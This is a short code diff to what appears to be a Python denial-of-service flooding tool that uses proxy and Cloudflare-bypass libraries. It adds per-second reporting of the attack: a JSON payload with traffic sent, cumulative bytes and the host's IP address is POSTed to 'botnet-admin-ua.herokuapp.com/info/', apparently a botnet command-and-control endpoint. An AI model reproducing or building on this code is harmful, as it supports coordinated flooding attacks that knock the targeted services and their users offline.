@@ -28,7 +28,6 @@ from uuid import UUID, uuid4
 
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
-from aiohttp import request
 from certifi import where
 from cfscrape import create_scraper
 from dns import resolver
@@ -1441,7 +1440,7 @@ if __name__ == '__main__':
                 event.set()
                 ts = time()
                 traffic_sum = 0
-
+                my_ip = getMyIPAddress()
                 while time() < ts + timer:
                     logger.debug('PPS: %s, BPS: %s / %d%%' %
                                  (Tools.humanformat(int(REQUESTS_SENT)),
@@ -1451,15 +1450,18 @@ if __name__ == '__main__':
                     traffic_sum += int(BYTES_SEND)
                     print(traffic_sum)
                     print(Tools.humanbytes(int(traffic_sum)))
-                    payload = dumps( {
+                    raw_payload = {
                             "hash" : "".join([randchoice(ascii_letters) for i in range(16) ]),
                             "time" : time(),
                             "traffic" : int(BYTES_SEND),
                             "traffic_sum" : traffic_sum,
-                            "ip" : __ip__
-                        })
+                            "ip" : str(__ip__)
+                        }
+                    print(raw_payload)
+                    payload = dumps( raw_payload )
                     headers = {'Content-Type': 'application/json'}
-                    post('https://botnet-admin-ua/info/', data=payload, headers=headers)
+                    #post('http://localhost:80/info/', data=payload, headers=headers)
+                    post('http://botnet-admin-ua.herokuapp.com/info/', data=payload, headers=headers)
                     REQUESTS_SENT.set(0)
                     BYTES_SEND.set(0)
                     sleep(1)
